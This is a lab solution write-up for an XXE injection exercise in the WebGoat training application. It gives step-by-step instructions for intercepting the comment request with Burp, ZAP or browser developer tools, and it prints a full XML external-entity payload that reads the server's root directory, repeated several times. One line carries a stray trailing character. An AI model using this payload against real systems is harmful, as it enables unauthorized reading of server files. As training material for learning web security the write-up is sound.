### Let’s try <a href="#lets_try" id="lets_try"></a>

In this assignment, you will add a comment to the photo, when submitting the form try to execute an XXE injection with the comments field. Try listing the root directory of the filesystem.

![](<../../../../.gitbook/assets/Screenshot 2020-04-28 at 16.15.55.png>)

#### Solution

* Hints: Try submitting the form and see what happens. Use ZAP/Burp to intercept the request and try to include your own DTD. Try to include a doctype "(\<!DOCTYPE...)" in the xml. This exercise is all about understanding how the XXE injection works.&#x20;

```
The include can be as follows: <!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]>e
```

* Do not forget to reference the entity.&#x20;

```
In the comment you should references: <comment><text>&root;test</text></comment>
```

* For this exercise we can use Burp, Zap or Developer Tools. First open the Intercepter (Burp) or Break (Zap). Then submit a comment on WebGoat. Analyze the request.&#x20;

* Analyze the format of the text "I am a cat" and the path of the Post request.&#x20;
* In the case of BurpSuite or ZAP, replace the text in the button for the following, to probe that the server is vulnerable:&#x20;

`<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`

* With Developer tools you can do the following steps:&#x20;

Open the _Development Tools_ in the browser, and go to the _Network_ tab.

On WebGoat, post a comment.

Locate the query to `simple` in the _Network_ tab and click on _Edit and Resend_.

Edit the body with:&#x20;

`<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>`
